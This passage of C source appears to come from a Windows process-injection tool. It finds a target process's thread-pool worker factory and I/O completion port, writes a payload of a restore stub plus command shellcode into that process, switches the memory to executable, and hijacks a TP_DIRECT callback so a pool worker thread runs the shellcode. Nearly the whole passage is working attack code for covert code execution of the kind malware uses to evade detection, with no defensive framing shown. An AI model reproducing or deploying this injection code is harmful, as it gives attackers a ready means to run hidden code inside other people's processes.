_CLOSE_FACTORY_AND_CONTINUE:
        if (hStolenWorkerFactory)
        {
            (VOID)g_APIs.pNtClose(hStolenWorkerFactory);
            hStolenWorkerFactory = NULL;
        }
_CLOSE_PROC_AND_CONTINUE:
        if (hCandidateProcess)
            (VOID)g_APIs.pNtClose(hCandidateProcess);
_NEXT_PROCESS:
        if (pCurrentProcInfo->NextEntryOffset == 0x00)
            break;
        pCurrentProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)pCurrentProcInfo + pCurrentProcInfo->NextEntryOffset);
    }

    if (!bResult)
        DBG("[!] FindTpInjectTargetProcess: Scanned Every Process, No Candidate Met Criteria");

_END_OF_FUNC:
    if (pSystemProcInfo)    HeapFree(GetProcessHeap(), 0x00, pSystemProcInfo);
    if (pHandleCache)       HeapFree(GetProcessHeap(), 0x00, pHandleCache);
    return bResult;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

//
// Patch TP_DIRECT.Callback to point at our restore stub, then fire one
// completion packet with KeyContext = &TP_DIRECT.
//
// The parked pool worker dequeues the packet, reads TP_DIRECT.Callback (now
// the stub entry), and calls it with RCX = TP_DIRECT*. The stub puts the
// original Callback value back and falls through to the shellcode. After the
// shellcode's 'ret', TppWorkerThread resumes its dispatch loop; subsequent
// completion packets dispatch to the real callback.
//
static BOOL HijackTpDirectCallback(
    IN HANDLE   hProcess,
    IN HANDLE   hIoCompletion,
    IN PVOID    pStubEntryVA,
    IN PVOID    pTpDirectVA,
    IN PVOID    pTpDirectCallbackVA)
{
    NTSTATUS    ntStatus    = STATUS_SUCCESS;
    SIZE_T      cbWritten   = 0x00;

    if (!hProcess || !hIoCompletion || !pStubEntryVA || !pTpDirectVA || !pTpDirectCallbackVA)
        return FALSE;

    // (1) Patch TP_DIRECT.Callback -> restore stub entry.
    ntStatus = g_APIs.pNtWriteVirtualMemory(hProcess, pTpDirectCallbackVA, &pStubEntryVA, sizeof(PVOID), &cbWritten);
    if (!NT_SUCCESS(ntStatus) || cbWritten != sizeof(PVOID))
    {
        DBG("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X (Wrote %lu/%lu)",
            ntStatus, (ULONG)cbWritten, (ULONG)sizeof(PVOID));
        return FALSE;
    }

    DBG("[+] Patched &TP_DIRECT.Callback=0x%p -> 0x%p (Restore Stub Entry)", pTpDirectCallbackVA, pStubEntryVA);

    // (2) Fire one completion packet. KeyContext = &TP_DIRECT.
    ntStatus = g_APIs.pNtSetIoCompletion(hIoCompletion, pTpDirectVA, NULL, STATUS_SUCCESS, 0);
    if (!NT_SUCCESS(ntStatus))
    {
        DBG("[!] NtSetIoCompletion Failed With Error: 0x%0.8X", ntStatus);
        return FALSE;
    }

    DBG("[*] Completion Packet Fired (hIoCompletion=0x%p, KeyContext=&TP_DIRECT=0x%p)",
        hIoCompletion, pTpDirectVA);

    return TRUE;
}


// ==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==

int wmain()
{
    TP_OBJECT_KIND  MatchedKind             = TpObjectKindNone;
    DWORD           dwProcessId             = 0x00;
    HANDLE          hProcess                = NULL,
                    hIoCompletion           = NULL;
    WCHAR           wszProcName[MAX_PATH]   = { 0 };
    PVOID           pTpDirectVA             = NULL,
                    pTpDirectCallbackVA     = NULL,
                    pOriginalCallback       = NULL;
    PVOID           pAllocatedAddress       = NULL;
    SIZE_T          cbPayloadSize           = 0x00,
                    cbAllocSize             = 0x00,
                    cbWritten               = 0x00;
    PBYTE           pLocalPayload           = NULL;
    PVOID           pStubEntryVA            = NULL;
    ULONG           uOldProt                = 0x00;
    NTSTATUS        ntStatus                = STATUS_SUCCESS;
    int             iExitCode               = -1;

    // (1) Resolve ntdll APIs + per-kind VFuncs table VAs.
    if (!InitializeNtApis())
        goto _END_OF_FUNC;

    DBG("[+] Nt APIs Resolved");

    // (2) Pick a target.
    if (!FindTpInjectTargetProcess(&MatchedKind, &dwProcessId, &hProcess, &hIoCompletion,
            &pTpDirectVA, &pTpDirectCallbackVA, &pOriginalCallback, wszProcName))
    {
        goto _END_OF_FUNC;
    }

    // (3) Build local payload: [restore stub (35 bytes) | shellcode].
    //     The stub's two data slots (original Callback value + &TP_DIRECT.Callback
    //     address) are patched by EmitRestoreStub in one shot.
    cbPayloadSize = sizeof(g_RestoreStubTemplate) + sizeof(x64CmdShellcode);
    if (!(pLocalPayload = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, cbPayloadSize)))
    {
        DBG("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    EmitRestoreStub(pLocalPayload, pOriginalCallback, pTpDirectCallbackVA);
    RtlCopyMemory(pLocalPayload + sizeof(g_RestoreStubTemplate), x64CmdShellcode, sizeof(x64CmdShellcode));

    DBG("[+] Local Payload Composed: %lu stub + %lu shellcode = %lu bytes",
        (ULONG)sizeof(g_RestoreStubTemplate), (ULONG)sizeof(x64CmdShellcode), (ULONG)cbPayloadSize);

    // (4) Allocate RW memory in the target.
    pAllocatedAddress = NULL;
    cbAllocSize       = cbPayloadSize;
    ntStatus = g_APIs.pNtAllocateVirtualMemory(hProcess, &pAllocatedAddress, 0, &cbAllocSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(ntStatus) || !pAllocatedAddress)
    {
        DBG("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
        goto _END_OF_FUNC;
    }

    DBG("[+] Allocated %lu Bytes @ 0x%p (RW)", (ULONG)cbAllocSize, pAllocatedAddress);

    // (5) Write the payload.
    ntStatus = g_APIs.pNtWriteVirtualMemory(hProcess, pAllocatedAddress, pLocalPayload, cbPayloadSize, &cbWritten);
    if (!NT_SUCCESS(ntStatus) || cbWritten != cbPayloadSize)
    {
        DBG("[!] NtWriteVirtualMemory Failed With Error: 0x%0.8X (Wrote %lu/%lu)",
            ntStatus, (ULONG)cbWritten, (ULONG)cbPayloadSize);
        goto _END_OF_FUNC;
    }

    DBG("[+] Wrote %lu Bytes @ 0x%p", (ULONG)cbWritten, pAllocatedAddress);

    // (6) Flip to RX.
    {
        PVOID   pFlipAddr   = pAllocatedAddress;
        SIZE_T  cbFlipSize  = cbPayloadSize;

        ntStatus = g_APIs.pNtProtectVirtualMemory(hProcess, &pFlipAddr, &cbFlipSize, PAGE_EXECUTE_READ, &uOldProt);
        if (!NT_SUCCESS(ntStatus))
        {
            DBG("[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X", ntStatus);
            goto _END_OF_FUNC;
        }
    }

    DBG("[+] Flipped Memory Protection From 0x%X To RX", uOldProt);

    // (7) Patch TP_DIRECT.Callback + fire packet.
    pStubEntryVA = (PVOID)((ULONG_PTR)pAllocatedAddress + RESTORE_STUB_ENTRY_OFFSET);
    if (!HijackTpDirectCallback(hProcess, hIoCompletion, pStubEntryVA, pTpDirectVA, pTpDirectCallbackVA))
        goto _END_OF_FUNC;

    DBG("[*] Done!");

    iExitCode = 0;

_END_OF_FUNC:
    if (pLocalPayload)
        HeapFree(GetProcessHeap(), 0x00, pLocalPayload);
    if (hIoCompletion && g_APIs.pNtClose)
        (VOID)g_APIs.pNtClose(hIoCompletion);
    if (hProcess && g_APIs.pNtClose)
        (VOID)g_APIs.pNtClose(hProcess);

    return iExitCode;
}
